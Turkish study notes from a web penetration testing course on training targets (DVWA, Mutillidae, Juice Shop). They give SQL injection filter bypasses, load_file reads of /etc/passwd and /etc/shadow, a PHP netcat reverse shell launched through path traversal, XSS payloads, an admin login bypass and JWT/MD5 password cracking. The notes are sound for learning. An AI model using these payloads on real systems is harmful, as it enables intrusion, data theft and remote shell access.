+bilgilerini görüntüleyebildik peki database isminin dvwa olduğunu bilmemiz ne işimize yarar 
+
+1'union select 1,table_name from information_scheme.tables where table_schema='dvwa' diyerek sadece bu veritbanındaki tablo isimlerini çekebiliriz 
+
+daha sonra dvwa security (solda) kısmından script level ı medium yapıp submit ediyoruz sql enjeksiyonu yapmamız daha da zorlaşacaktır 
+
+daha sonra soldan sql injection u seçiyoruz ' işareti yazıp submitliyoruz ve hata aldık 1'AND 1=1# yazıp submit ettik hata aldık 
+medium a geçtiğimiz için bununla ilgili bir önlem alındığını gördük 
+buradaki inputlara sql injection cheat sheet github veya sadece sql injection cheat sheet yazıp buradaki kodları çalıştırabiliriz 
+
+medium level da 1'AND 1=1# kodunda ' (tırnak işareti bloklanmış olabilir) bu yüzden bu http request olarak gittiğinde ' karakteri direkt siliniyor 
+olabilir 1=1 veya # de filtrelenmiş olabilir bumların hangisinin veya hangilerinin filtrelendiğini kendimiz deneyerekbulmamız gerekiyor 
+'AND 1=1# çalışmaz ise bunu 'OR 1=1# ile değiştirebiliriz bu da çalışmazsa 'AND 40=40# ile deneyebiliriz klasik olarak sadece 1=1 e blok koymuş olabilir 
+veya AND yada OR a koymuş olabilir white space yani "  " boşluk a block koymuş olabilir bu durumlarda da '+AND 1=1 veya diğer varyasyonlarını deneyebilriiz 
+hatta bunların hiç biri çalışmıyorsa direk olarak 'union select 1,table_name from information_scheme.tables where table_schema='dvwa'
+şeklinde union select i deneyebiliriz ya da union select i denerken UnIoN select şeklinde büyük küçük harf deneyerek yazmak işe yarayabilir 
+bu filtrelemeyi atlatmak için ya da uNiOn+sElEcT şeklinde de yazabiliriz burada boşluk engellenmiş olabilir bunu + kullanarak aşabiliriz 
+ uNiOn+sElEcT+1,2,3,4,5# veya uNiOn+sElEcT+1,2,3,4,5-- ya da uNiOn+sElEcT+1,2,3,4,5// (YORUM SATIRI KARAKTERİ KULLANARAK DENEYEBİLİRİZ)
+ ya da # karakteri bloklanmış olabilir onun yerine bunun hex kodunu yazarak uNiOn+sElEcT+1,2,3,4,5%23 diyip deneyebiliriz ya da boşluk koymak yerine 
+ uNiOn%20sElEcT%201,2,3,4,5%23 boşluğun hex kodunu(hex mi onu öğren yanlış öğrenmiş olma) yazarak deneyebiliriz tek tırnak işaretini de bloklamış olabilir 
+ bu gibi durumlarda ' = %27 yazarak bunu atlatmaya çalışabiliriz ya da filtrelemede tırnak işareti koyduğumuzda bunu silip daha sonra kendi istediği yere koyabilir 
+ bu gibi durumlarda yazılımcı gibi düşünüp nereye koyacağına göre bir strrateji geliştirebiliriz 
+
+dvwa de soldan sql injection u seçip security level ı medium yaptıktan sonra ' işaretini kaldırıp hiç tırnak işareti içermeyen parametreleri 
+çalıştırabildiğimizi öğrenmiştik peki içinde tırnak işareti bulunan bir parametreyi medium da nasıl çalıştırabiliriz örneğin 
+1 union select 1,table_name from information_scheme.tables where table_schema='dvwa' yazdığımızda tırnak işaareti içerdiği için bize hata verecek 
+tırnak işaretlerini kaldırıp 1 union select 1,table_name from information_scheme.tables where table_schema=dvwa dediğimizde de bu sefer dvwa i bulamadığını 
+söyleyecek çünkü bunun bir string ifade olarak tanıması için tırnak işareti koymamız gerekiyor ne yapacağız bunu çalıştırmak için ? 
+1 union select 1,table_name from information_scheme.tables where table_schema=%27dvwa%27 koyduğumuzda da hata verdi çalışmadı 
+url de %27yi değiştirerek göndermiş %25 yapmış buradan değişen kısmı silip başını ve sonunu %27 olarak dğeiştirip enterladığımızda da çalışmadı 
+tek tırnak ' ı hex olarak yazıp deneyebiliriz bunun için burpsuit i açıyoruz Decoder tabına geliyoruz sağda üstteki Encode as kısmını Hex seçiyoruz 
+daha sonra aşağıdaki kutunun sağındaki en üst kısımda Text ve Hex olan radiobuttonlardan Hex i seçiyoruz ' işaretinin hex kodu 0 27 ymiş bu
+bunun hex karşılığı 0x27 dir ama böyle deneyince de çalışmadı dvwa in hex kodunu alalım ve bu şekilde deneyelim üsttekü kutucuğa dvwa yazıyoruz 
+hex kodu 0x64767761 miş; dvwa in 
+1 union select 1,table_name from information_scheme.tables where table_schema=0x64767761# şeklinde deniyoruz 
+ve çalıştı 
+
+bu dersimizde sql de farklı metodlarla veritabanın bulunduğu sunucuya (işletim sistemine) nasıl veri yazarız ve bu sistemdeki verileri okuruz bunu öğrenelim 
+(sql veritabanına değil sunucunun kendisine/işletim sistemine) dvwa security i low a ayarlıyoruz ve tekrar sql injection kısmına tıklıyoruz (dvwa de) 
+
+1' union select 1,load_file('/etc/passwd')# ve bunu sql injection inputuna yapıştırıp submit dediğimizde load_file metodu komutu ile bu veritabanın 
+bulunduğu sunucudaki /etc/passwd dizinindeki dosyayı yükleyebiliriz/ekrana getireibliriz,bastırabiliriz 
+yine aynı şekilde 1' union select 1,load_file('/etc/shadow')# dosyasını okuyabiliriz (bunu yazdığımızda bir çıktı alamadık bu her dosyada çalışacak diye bir
+şey anlamına gelmiyor) bazı durumlarda 1' union select null,load_file('/etc/passwd')# baştaki 1, kısmına null, yazmamız gerekebilir 1 kısmında hiç bir 
+çıktı gelmeyecekse (neden null yazıldığının mantığını anlamadım bunu araştır) 
+/passwd isimli dosyayıokuma iznimiz olduğunu gördük peki sistemdeki dosyalara veri  yazma iznimiz var mı bunu da kontrol edelim 
+
+1' union select 1,'test' into out file '/tmp/test.txt'# yazarak /tmp dizinine yani sistemde geçici dosyaların tutulduğu sistem yeniden başlatıldığında veya kapatıldığında 
+buradaki dosyaların silindiği sadece geçici dosyaların tutulduğu dizine text.txt isminde içinde test yazılı bir dosya oluşturailiyor muyuz/yazabiliyor 
+muyuz bunu kontrol ediyoruz yazabiliyorsak yazma yetkimiz var demektir burada kullanılan into out file komutu sql de bir dosyaya veri yazma komutudur 
+1,'text' ile yazacağımız stringi veya değeri elirttikten sonra into out file diyerek hangi dizindeki dosyaya yazılacağını seçeriz hangi dizindeki 
+dosya yolunun etrafında neden tırnak işaretleri var bunu araştır anlamadım bir kaç tane hata mesajı aldık bu şekilde denediğimizde yazılıp yazılmadığını 
+doğrulamak için bir kaç örnek çnce kullandığımız  1' union select 1,load_file('/tmp/test.txt')#  parametresini submit ediyoruz 
+ve yazavildiğimizi görüyoruz (gelen çıktıda 1  test yazıyor 1 sütununu getirdikten sonra dosya içeriğini yani -test- stringini bastırdı ekrana bu da 
+yazabildiğimizi doğrular)
+
+bu dersimizde sql açığını kullanarak hedef cihazda nasıl shell açılır bunu öğrenelim 
+
+bir inputta sql açığı çalıştırmamız çok büyük tehlikedir çünkü bu açığı kullanarak viewly de bir php shell dosyası oluşturup bunu sql kodu ile serverda çalıştırıp 
+bu bağlantıyı kendi bilgisayarımızdan dinleyebiliriz <?passthru("nc kali-ip-adresi 1234 -e /bin/sh");?> /sh olmassa /bash deneyebiliriz 
+buradaki ip local ip bu tarz örneklerde ms ile çalıştığımız için hep local ip kastedilir/kullanılır
+bu her zaman kullanabileceğimiz bir php reverse shell komutudur bunu bir sql komutunda çalıştırmak için 
+
+1' union select 1,'<?passthru("nc kali-ip-adresi 1234 -e /bin/sh");?>' into out file '/tmp/myshell.php'#
+genelde bir veriyi/kodu var/www/html e yazmak çok daha tehlikelidir /tmp e yazmak yerine veya /var/www/dvwa e yazmak daha tehlikelidir 
+ama bu uygulamada buna izin vermedi hata verdi /tmp/myshell.php kodunu submit ettiğimizde çalıştığını görüyoruz biz şuan sadece bu zararlı kodu içeren 
+bir php dosyasını oluşturduk ama bunu çalıştıramazsak dosyanın var olmasının hiç bir anlamı olmayacak /www/dvwa dizinine yazabilseydik/oluşturabilsekdik php dodyamızı 
+direk olarak url den ilgili dizindeki dosyanın yolunu belirterek url üzerinden dosyamızı çalıştırıp bağlantı açabilirdik -işte bu yüzden buraya oluşturdmak 
+daha tehlikelidir!!!- ama bunu yapamadık /tmp e gidebilmek için ya directory traversal bulmamız lazım ya da başka bir yöntem bulmamız gerekiyor 
+
+ki dvwa e de directory traversal açığı olduğunu biliyoruz öncelikle kalide terminalde nc -nvlp 1234 çalıştırıyoruz daha sonra browserdan 
+File inclusion kısmına tıklıyoruz (Dvwa'de) daha sonra url ye( sadecepage= den sonrasını bu şekilde değiştirip enterlıyoruz)
+ ?page=../../../../../tmp/myshell.php yazıp enterladığımızda ;/tmp/myshell.php i çalıştırabiliriz burada 5 adet ../ kullanmamızın sebebi de 
+ .. komutu linux sistemlerde mevcut dizinden bir önceki dizine git komutudur bunu yaparak root dizinine kadar yan(/) gittikten sonra 
+ devamında tmp/myshell.php yazarak ilgili dosyayı çalıştırabiliriz ve halihazırda bağlantıyı netcat ile dinlediğimiz için şimdi kali terminalimize 
+ geri dönüyoruz coonect to 10.0.2.4 (bizim kalimizin ip si) from (hedef cihazdan anlamına gelir ... ip adresinden anlamında) 10.0.2.5
+ bu bağlantımızın gerçekleştiği anlamına geliyor 
+
+ bu dersimizde sql map aracını öğrenelim 
+
+ browserdan mutillidae ye giriyoruz sol tarafa OWASP TOP 10 > A1-Injection > SQLi -Extract Data > User Info kısmına tıklıyoruz 
+ username:Admin password:admin yazıp wiew account details diyoruz ardından da url deki linkin tamamını kopyalıyoruz 
+ kaliye geliyoruz sqlmap -u "kopyaladıgımız-url" (linki tırnak içerisinde yazmamız gerekiyor) ardından parametre de bir cookie belirtilmediğini tool un 
+ halihazırda bir cookie bulduğunu ve bununla deneyip denemek istemediğimizi soruyor Y(Büyük y ye basıp enterlıyoruz) 
+ sql map de bir soru sorduğunda hangi cevap öneriliyorsa onu büyük harfle yazar buradan hangi cevabı seçmemiz gerektiğini az çok anlayabiliriz
+ işlem tamamlandıktan sonra gelen çıktıda parameter: username (GET) type:boolean-based blind satırının altında Payload: satırındaki 
+ admin' OR NOT 8886=8886# ifadesini browserda Name inputuna yazıyoruz şifre kısmına dda herhangi bir şey 123 yazıp submitliyoruz ve adminin 
+ kullanıcı adı şifresi ve signature unu görmeyi başardık 
+
+ bu dersimizde juice shop denilen içerisinde bazı açıklar bulunduran ve bizim bu açıkları tespit edebildiğimiz bir sistemdir 
+ juice shop, metasploitable a göre daha yeni teknolojiler kullanılarak (node.js,express,angular) oluşturulmuştur 
+
+ https://github.com/bkimminich/juice-shop linkinden juice shop u yükleyebiliriz 
+
+ https://signup.heroku.com/ heroku isimli bir sunucu hizmeti sunan bir siteye kaydolmamız gerekiyor ardınan doğrulama linkine tıklayarak 
+ hesabıımzı doğrulayıp hesabımıza giriş yapıyoruz ve 
+
+ https://github.com/bkimminich/juice-shop linkindeki Deploy on Heroku (free ($0/month) dyno) satırının altındaki mor renkli Deploy to Heroku 
+ butonuna tıklıyoruz appname kısmına meyvesuyu dükkanı yazabilriz (başkaları daha önce bu isimi kullandıysa başka bir şey yazmamız gerekiyor)
+ choose a region europe yi seçiyoruz ve ardından Deploy app butonuna basıyoruz daha sonra işlem bittiten sonra (15 dkaika kadar sürebilir)
+ Your app was successfully deployed. satırının altındaki sağdaki View butonuna basıyoruz burası açık kalırken uygulama ile işimiz bittikten sonra silmek için 
+ az önce tıkladığımız kısımda bir de solda Manage App e tıklıyoruz yukarıdaki Settings tab ına tıklıyoruz ve en aşağıda Delete app... e basarak 
+ uygulamammızı silebiliriz 
+
+bu dersimizde scoreboard konusunu öğrenelim 
+öncelikle burpsuit i açıyoruz foxyproxy i tarayıcımızdan açıyoruz daha  sonra intercept i açıyoruz sayfamızı refresh ediyoruz 
+sayfamıza sağ tık yapıp inspect element i seçip web geliştirici konsolu açabiliriz bu konsolda debugger tabında tarayıcıdaki javascript komutları 
+bizim kendi browserımızda -client- ımızda çalıştırıldığı için burada çalıştırılanjavascript kodlarını görebiliriz  php gibi web sunucuda 
+çalışan kodları göremeyiz! sol tarafta Main Thread başlığının altındaki (index) kısmına tıklarsak hangi js kodları çalıştırılıyor bunları görebiliriz 
+index kısmının altında da pek çok bölüm var main polyfills runtime vendor  şeklinde bunlara tıkladığımızda javascript kodlarının tek bir satırda 
+yazıldığını görüyoruz bu görüntü olarak güzel ve açıklayıcı değil bunun için sağ tarafta kodların göründüğü kısmın en altında {} (süslü parantez)
+ikonuna tıklayarak kodları daha okunabilir hale getirebiliriz 
+şimdi bu saydığımız kısımların içerisinde scoreboard anahtar kelimesini arayacağız (index) kısmına tıklayıp ctrl+f yapıp score diye aratıyoruz ancak burada 
+bir şey çıkmadı main-es yazana tıklıyoruz score yazıyoruz path:score-board isimli bir satır bulduk (buradaki path programlama dilinde ne anlama geliyor araştır)
+url ye gelip #/score-board olarak dğeişitirip -sonunu- enterlıyoruz burada pek çok açık ile iligli çözmemiz istenilen bazı problemler ve bu açıklar ile ilgili 
+tutorial (öğretici dersler) in bulunduğu tablar var Show Tutorials Only kısmına basarak ilgili problemin nasıl çözüleceğine dair bilgiyi kep (mezuniyet şapkası)
+simgesine basarak görüntüleyebiliriz yukarıdaki tablardan birine bastığımızda onu seçmiş oluyoruz 1,2,3,4,5 yıldız zorluk seviyesine sahip olan seçenekleri 
+ve başka diğer seçenekleri tekrar sçeimden kaldırmak için üzerlerine bir kez daha tıklamamız gerekiyor biz sadece en baştaki içinde 1 yazan yıldızı seçeceğiz
+yeni başladığımız için arada bazen çözmememize rağmen çözülmüş gibi örnekler olabilir (solved yazan örnekler) bunların sebebi burpsuite arkaplanda 
+bazı crawl işlemleri yaptığı için ilgili problemin çözülmesi de bu gilzi dizinin bulunması ile alakalıysa çözülmüş gibi görünebilir 
+web sitesini araştırmaya başlarken yappmış olduğumuz bir kaç işlem vardır dirbuster(bu tool un ne işe yaradığını araştır buraya yaz) kullanmak bunlardan biridir 
+ama bu uygulamada manuel bulmaya çalışacağız ikincisi de nikto gibi araçları çalıştırmaktır nikto bir web pentesting aracıdır
+web sitesindeki basit açıkları ve genel bilgileri bulmak için kullanılır nikto -h (tarama-yapılacak-sitenin-adresi) (bizim uygulamamızda 
+herokuapp.com/ şeklinde bitecek) bizim test yaptığımız site ne kadar zaafiyetli bir makina olsa da bu makine heroku şirketinin sunucularında barındırıldığı 
+için ip mizin banlanma riski olduğu için aramayı uzun tutmadan ctrl+c ile taramayı durduruyoruz biz bu derste 1 yıdızlı zorluktaki örneklerin
+3. satırındaki DOM XSS i bulmaya çalışacağız şimdi sitenin sol  tarafında bulunan yatay alt alta 3 adet satır çizgisine tıklıyoruz açılan kısımdan 
+Customer Feedback kısmını seçiyoruz (burası geri bildirim formudur-normal sitelerde siteyi puanladığımız dilek ve şikayetlerimizi reportladığımız kısım)
+author kısmı şuan anonymous olarak gözüküyor çünkü henüz daha sitemize bir üyelik oluşturup giriş yapmadık 
+Comment kısmına <iframe src="javascript:alert('xss')"> komutunu yapıştırıyoruz herhangi bir rating (kaç yıldız olarak puanladığımız kısım) verip 
+CAPTCHA problemini giriyoruz ve Submit ediyoruz ama herhangi bir bildirim gelmedi demekki yaptığımız işlem başarılı olmadı o zaman başka yerlerde 
+arayalım sitenin sağ üst kısmından Accounts bölümünden login kısmına e-mail ve password kısmına -ikisinede- <iframe src="javascript:alert('xss')"> 
+yapıştırıp log in diyoruz ancak yine bir şey olmadı yine sağ üstte Accounts kısmının hemen solunda bir search kısmı var buraya <iframe src="javascript:alert('xss')">
+kodumuzu yapıştırıp enterlıyoruz ve ekrana xss yazan bir alert gldi bu kodumuzun başarıyla çalıştığı anlamına geliyor yani xss imizi bulduk 
+url kısmı reflected xss ile aynı peki dom xss in farkı ne aslında dom terimi html de kullanılan bir kavram açılımı (document object model) 
+(dökuman obje modeli) anlamına gelir biz bir browserda bir html dosyasını açtığımızda ilgili dosyadaki html kodunun bir şeması çıkarılır 
+ve buna dom denir yani html dom da yapılan bir değişiklik html kodlarının içerisinde yapılan bir değişikliktir yani bu yaptığımız injection 
+server tabanlı serverda gerçekleşen bir değişiklik değil client tarafta sadece sunucuda gerçekleşen bir değişikliktir 
+
+bu uygulamamızda juice shop da acoounts kısmına tıklayıp not yet a customer? bağlantısına tıklıyoruz 
+peki bir hesap oluşturma formunda ne gibi açıkları deneyebiliriz 
+email kısmına atil@test.com yazıyoruz Password kısmına 123456 > repeat password kısmına da 123456 veriyoruz security questions > maternal grandmother's 
+first name > test yazıyoruz ve şuan register butonu aktif oldu bütün kurallara uygun bir şekilde bir hesap oluşturma adımlarımızı gerçekleştirdik 
+ve şimdi tekrar password kısmına gelip 123456 olan şifremizden 6 karakterini silerek sadece 12345 i bırakıyoruz aşağıdaki repeat password hala 
+123456 ve hiç bir hata almadık hala register olabiliyoruz bu geliştiricilerin bu açık ile ilgili bir filtreleme yapmadıkları anlamına gelir 
+dry principle yazılımda bir prensiptir (dont-repeat-yourself) den geliyor bir kod yazarken devamlı aynı kodu yazmaya başladıysak işin hamallığını 
+yapıyoruz ve verimsiz bir program yazdığımız bunu daha efektif ve hızlı kolay bir şekilde çözmemiz gerektiğini söyleyen bir prensiptir 
+bir de bunun tam tersi WET (write everything twice-her şeyi iki devam yaz) prensibi vardır wet in diğer bir açılımı da write every time (her seferinde yaz)
+
+bu dersimizde yıldızsız geri bildirim örneğini çözelim 
+
+www.uygulamamızın-ismiherokuapp.com/#/search adresinde iken sağ tık yapıp inpect element diyoruz Debugger tabına geliyoruz 
+main-es2015.js tabına tıklıyoruz daha sonra ctrl+f ile redirect yazıyoruz 13.185 . satırdaki ./redirect itibaren atırın sonuna kadar ki ifadenin 
+rtamamını kopyalıyoruz copy source text diyoruz ve heroku.com/redirect şeklinde ve geri kalanını yapıştırıp enter diyoruz . ve hash kısmını 
+silmemiz gerekiyor ve bizi blockchain.com daki bir hesap a yönlendirdi ve bu problemi de çözmüş olduk şimdi 
+tekrar juice shop un sol üstteki 3 çizgi ye tıklayıp Customer Feedback e tıklıyoruz şimdi biz burada yıldızsız bir geribildirim ypamak istyoruz 
+ancak herhangi bir star ı seçmeden submit etmemize izin vermiyor bu sayfada sağ tık diyip inspect element yapıyoruz inspector tabında 
+iken buradaki kodlardan <button id ="submitButton" kısmını bulmamız  gerekiyor bu kodun üstüne gedliğimizde zaten arka planda submit butonumuz 
+seçilecektir bu kodun burayı ifade ettiğini göstermek için bu 2 satırlık kodun 2. satırında disabled="false" değerini enabled="true" yapıyoruz 
+bu koddaki ilk değer olan disabled bu button etiketinin bir özelliğidir ekin olmayan deaktif anlamına gelir yani butonun tıklanabilir olma özelliği 
+bir rate star vermeden enabled olmasın koşulu konulmuş bunu bypass etmek için burayı enabled"true" yaptık 
+
+bu dersimizde başkasının alışveriş sepetini görüntüleme açığını uygulayalım 
+juice shop da yeni oluşturduğumuz hesaba giriş yaptığımızı varsayarak sağ üstteki Accounts kısmına tıklıyoruz buradan Privacy & Security kısımna 
+geliyoruz (imleci stüne getiriyoruz sadece/tıklamıyoruz) buradan gelen seçeneklerde en üstteki Privacy Policy e tıklıyoruz ve bunu okumamızı 
+istediği görevi de tamamlamış olduk (bunu okumamızı istemesi büyük ihtimalle siteyi daha iyi tanımamızı ve hacklerken işimize yarayan trickleri 
+öğrenemmizi istemesidir burayı oku iyice anla!)
+
+daha sonra sol üstteki OWASP Juice Shop kısmına basarak meyvesularının oldğu product ekranına geri dönelim 
+burada sepetimize Apple Juice ve Apple Pomace yi Add to basket butonuna basarak ikisini de sipariş sepetimize ekliyoruz 
+daha sorna sağ üstten alışveriş arabası ikonuna Your Basket yazısının olduğu kısma tıklıyoruz az önce eklediğimiz ürünleri şuan sepetimizde görebiliyoruz 
+peki başkasının kendi sepetine eklediği ürünleri yani başkasının alışveri sepetini görebilirz miyiz buna bakalım 
+
+bunun için your basket sayfamızda sayfanın boş kısmında sağ tık yapıp inspect element diyoruz Style Editor tabından sayfadaki kodları daha düzgün bir şekilde görebiliriz 
+Performanca tabından sitenin bir çalışma performansı profili vs varsa buradan görüntüleyebildiğimiz bir kısımdır Network tabından 
+yapılan GET ve POST requestleri görüntüleyebiliriz ama bunu zaten burp suit ten yapıyoruz buraya çok da gerek kalmıyor Storage tabı önemli
+Storage taında sol en altta Session Storage kısmı önemli / session örneğin biri hesabıyla siteye girdiği andan site hakkındaki işlemini sonlandırıncaya kadar 
+olan süreç yani oturumu demektir bu kısımda bizimle ilgili bazı bilgiler saklanabiliyor örneğin cookie bilgileri vs ve böylece bizim session umuz 
+kaç dakika sürdü hangi ürünlere bağlantılara tıkladık hangi ürünleri sepetimize ekledik eklediğimiz ürünlerin kaç tanaesini satın aldık siteler 
+bu bilgileri takip edip bununla ilgili pazarlama reklam stratejileri geliştirirler örneğin sepete ekleyip satın almadığmız bir ürün için indirim 
+yaparak onu satın almamızı sağlarlar Session Storage kısmına tıklıyoruz ve hemen altında    bir url çıkıor buna tıklıyoruz 
+ve sağ tarafta bid (bu satın alıcının veya sepetin id si olabilir) ve bu bid nin karşısında Value sütüunun altındaki eğeri yani bid nin 
+value si /değeri 6 buna anahtar(key)-değer(value) eşleşmesi denir bu Value kısmının altındaki 6 nın yazılı olduğu inputa tıklayıp 2 yapıp 
+f5 ile sayfamızı yeniliyoruz ve başkasının sepetini görüntülemeyi başardık burada bizim sepete eklemeidğimiz bir ürün olan Strawberry Juice i görüyoruz 
+dilersek buradan bu sepetteki bu ürünün sayısını artırıp azaltabiliriz 
+ 
+ juice shop dan logout oluyoruz ve tekrar Login ekranına geliyoruz burada bir sql enjeksiyonu var mı bunu öğrenmek için 
+ öncelikle foxyproxy ve intercept i açıyoruz 
+
+email = atil@test.com (bizim kayıtlı olan hesabımızın maili neyse onu yazacağız) passwoord = 123456' AND 1=1# yazıp login oluyoruz 
+ancak hesabımıza giriş yapamadık şifremiz 123456 olmasına rağmen ' AND 1=1# kısmından dolayı login olmadı 
+burpsuit target tabınndan Site map kısmına geliyoruz http:owaspjuiceshopatil.herouke.com (biz heroku ya hangi isimle kaydettiysek burada 
+sağ tarafta o satırı bulacağız) sağ tık yapıp Add to scope diyoruz 
+ (kapsama sadece bu siteyi al sadece bu sitenin sonuçarını getir anlamına gelir) daha sınra yes diyoruz artık bu sitenin haricindeki herhangi 
+ bir siteyi intercept etmeyecektir burp  daha sonra Site map yazan tab ın hemen altında Filter:Hiding kısmına tıklıyoruz ve açılan kısımdan 
+ Show only in-scop items diyoruz ve programda başka herhangi bir yere tıkladığımızda seçimimizi ve gitirilecek olan ıktıları güncellemiş oluruz 
+ ve diğer bütün siteler gidip sadece scope a aldığımız sitenin sonuçları kalacak 
+ daha sonraa Proxy > İntercept tabında yakalanan login isteğimizi görüyoruz buradaki isteğin olduğu kısımda sağ tık yapıp Send to Repeater 
+ diyoruz daha sonra Repeater tabını açıyoruz repeater a yolluyoruz ki gelen cevapları da görebilelim diye 
+ daha sonra Send diyoruz en üstteki butondan ve sağ tarafta Response kısmında bir cevabın geldiğini görüyoruz 15 satırda invalif email or password 
+ diyor (email veya şifre geçersiz hatası aldık) daha sonra tekrar juice shop Login ekranına gelip bu sefer email kısmında bir sql enjeksiyonu var mı 
+ bunu kontrol edelim bunun için password kısmına 1 yazıyoruz email kısmına da atil@test.com' AND 1=1#yazıplogin oluyoruz daha sonra bu isteği 
+ burp yakaladığı için proxy > intercept kısmına geliyoruz 10 defa Forward tuşuna basıyoruz (13. satırda süslü parantez içerisinde yeşil renkle 
+ email ve şifre nin yer aldığı istek gelinceye kadar..)
+bu kısma sağ tık yapıp send to repeater  diyoruz daha sonra tekrar repeter tabına geliyoruz daha sonra Send butonuna basıyoruz 
+ve bir hata geldi sağ tarafta ve hata mesajı oldukça detaylı bir hata mesajı bu hata mesajından şunu anladık ki blind bir sql enjeksiyonu yok 
+çünkü response da detaylı bir hata mesajı aldık  22. satırdaki *sql*: kısmından sonraki *SELECT den başlayıp IS NULL" olan kısma kadar yani 
+en sonuncu değere kadar kopyalayıp bir txt dosyasına yapıştırıyoruz bu hata mesajında bizim sorgumuzu Users isimli bir table dan ve 
+inputa girilen passwordu hashleyerek yolluyor ve AND deletedAt IS NULL diyor yani silinen kullanıcılardan biri ise yani girilen kullanıcı silinen 
+bir kullanıcı ise emain şifresi doğru olsa bile login yaptırma diyor 
+daha sonra burp suite gelip 9-10 defa forwardlıyoruz (her şeyi forwardlıyoruz) ve intercept i kapatıyoruz sadece hata mesajı aldık ve detaylı bir hata mesajı 
+değildi response kısmında aldığımız gibi o yüzden atil@test.com' OR 1=1# yapıp (şifre 1) tekrar login oluyoruz yine bir hata aldık 
+atil@test.com' OR 1=1;# password=1 diyerek login oluyoruz ve admin kullanıcısı ile login olmayı başardık peki biz email de 
+normal bir kullanıcı ile yani kendi mail imiz i yazmıştık  nasıl admin kullanıcısı ile login olduk bunun sebebi 
+ya mail ile login ol ya da OR kullandığımız için ilk kısım çalışmaz ise 2. kısım ile login ol dedik 2. kısım çalıştı ve biri birinci id numaralı 
+kullanıcı ile sisteme login yaptı o kullanıcı da admindi daha sonra sağ üstten Accounts kısmına tıklıyoruz User Profile sayfası açılıyor 
+admin@juice-sh.op.com olduğunu öğreniyoruz admin in emailinin daha sonra sağ üstteki Acoounts kısmından Orders & Payment > Order History 
+kısmına tıklıyoruz burada adminin daha önce aldığı/sipariş verdiği ürünler var Orders & Payment kısmından My Payment Options kısmına tıklıyoruz 
+burada adminin kredi kartı bilgilerini/ödeme iblgilerini görebiliyoruz yine Orders & Payment kısmından Digital Wallet a tıklıyoruz 
+burada dminin dijital cüzdanını görebiliriz daha sonra yine Orders & Payment kısmından my saved addresses kısmından adminin kayıtlı olan adreslerini 
+görebiliriz daha sonra Privacy & Security kısmından Request Data Erasure kısmına tıklayarak adminin verilerini silebiliriz 
+Privacy & Security kısmından Request Data Export kısmına tıklıyoruz verilerini aktarabiliriz başka bir ortama yine P & S kısmından 
+2FA Configirations kısmına tıklıyoruz daha sonra sol en üstteki alt alta 3 çizgiye tıklıyoruz Deluxe Membership isminde büyük ihtimalle vip lere 
+özel bir üyelik çeşidi var 
+
+bu dersimizde juice shop da cookie şifrelerini kırmayı öğrenelim 
+adminin şifresini öğrenmenin 2 yolu vr birisi brute force attack 2 cookie şifresini kırmak 
+Login ekranına gelip atil@teat.com'OR 1=1;# password kısmını 1 yapıp login oluyıruz admin olarak login olduktan sonra sağ tık yapıp 
+Inspect Element diyoruz Storage tabına geliyoruz Sol taraftaki Cookies kısmına tıklıyoruz tıklayınca hemen Cookies başlığının altında 
+bir satır çıkacak olan tıklıyoruz -satırın başında turkuaz renkli bir + işareti var- biz admin olarak giriş yaptığımız için admin in cookie lerini 
+görüyoruz burada sağ tarafta çıkan token yazan satıra tıklıyoruz bu satırın Value sütnunundaki uzun stringi kopyalıyoruz 
+https://jwt.io/ sitesindeki aşağıdaki Encoded inputuna yapıştırıyoruz bu admin in cookie si ve içerisinde onun giriş bilgilerini 
+username ve passwordunu içeren bilgiler bulunabilir ama bu bilgiler encode edildiği için bunu bu sitede decode etmek istiyoruz yapıştırınca 
+6. satırda adminimizin passwordunu şifrelenmiş bir şekilde görebiliriz token ile şifrelenen şifre bilgisinden önce bir kez daha şifrelenmiş ama bu şifreyi 
+de kırmaya çalışabiliriz hashlenmiş bu şifrenin ne ile hashlendiğini bulmak için kali linux terminalinden kali ile hazır gelen 
+hash-identifier yazarak bu toolu çalıştırabiliriz kopyaladığımız bu şifreyi buraya sağ tık Paste clipboard (ctrl+shift+v) yapıyoruz ve enter 
+lıyoruz bize pek çok çıktı verdi ama en çok MD5 ve onun varyasyonları ile olabileceğini söylüyor 
+https://www.md5online.org/md5-decrypt.html sitemize bu şifremizi giriyoruz decrypt butonuna basıyoruz ve şifremizi admin123 olarak 
+bulduğunu görüyoruz  
+
+bu dersimizde juice shop da admin paneline gitiş nasıl yapılır onu öğrenelim
+admin panelini bulmak için dirbuster çalıştırabiliriz 
+kendimiz manuel olarak deneyebiliriz juice shop anasayfasında sağ tık inspect element diyoruz Debugger tabına tıklıyoruz 
+sol taraftaki main es kısmına tıklayıp ctrl+f ile 16.680. satırda path: administration isimli bir yol/site uzantısı/site bağlantısı olduğunu 
+görüyoruz şimdi bunu url de deneyelim /administration (en sondaki search kısmını bu şekilde değiştirip enterlıyoruz)
+ve admin sayfasına giriş yapmayı başardık ve admin paneline/sayfasına giriş yap isimli challange ı çözmüş olduk 
+şimdi admin panelinde hangi bilgiler var ona bakalım bir kere bütün kullanıcıları görebiliyoruz sol tarafta listelenmiş bir şekilde 
+herhangi bir kullanıcının karşısındaki göz ikonuna tıklarsak o kullanıcı ile alakalı ilgili kullanıcı ne zaman oluşturuldu tarih bilgisi 
+bu hesap ne aman güncellendi tarih bilgisi bilgilerine ulaşabiliriz en son kullanıcının altındaki sağ yön ok tuşu ile next page e giderek 
+sitedeki diğer kullanıcıları listelenmiş bir şekilde görebiliriz en sonda bizim oluşturduğumuz kullanıcı var 
+sağ tarafttaki kısımda customer feedback (müşteri geri bildirimleri gözükür) challangelarımızdan biri 5 yıldızlı geribildirimleri sil 
+di o yüzden en üstteki 5 yıldızlı geri bildirimi hemen yanındaki çöp kutusu ikonuna tklayarak siliyoruz ve bu problemimizi de tamamladık 
+
+şimdi biraz daha ileri seviye zaafiyetlere geçelim bu dersimizde xxe açıklarına bakalım 
+customer feedback sayfasında daha önce denemiş olduğumuz xss zaafiyetlerinin çalışıp çalışmadığını admin paneline girerek test etmemiz gerekiyor çünkü 
+bu feedbackler sadece admin panelinde gözüküyor ? (yoksa ürünlere tıkladığımızda girilen yorumlarda da gözüküyor mu burayı araştır buraya yaz 
+yoksa o yorum yapma tamamen ayrı bir konu başka bir şey mi)
+
+juice shop a admin kullanıcısı ile giriş yaptıktan sonra sol üstteki 3 adet yatay çubuk ikonuna tıklayıp Complait e tıklıyoruz 
+burası sayfanın şikayet kısmıdır Message kısmın şikayetimizi giriyoruz ve onun heöen altında fatura ya da ürünle ilgili fotoğraf göndermemiz 
+için bir dosya upload alanı oluşturulmuş buradaki Browse butonuna tıklıyoruz açılan pencerede sağ alttaki All Supported Types 
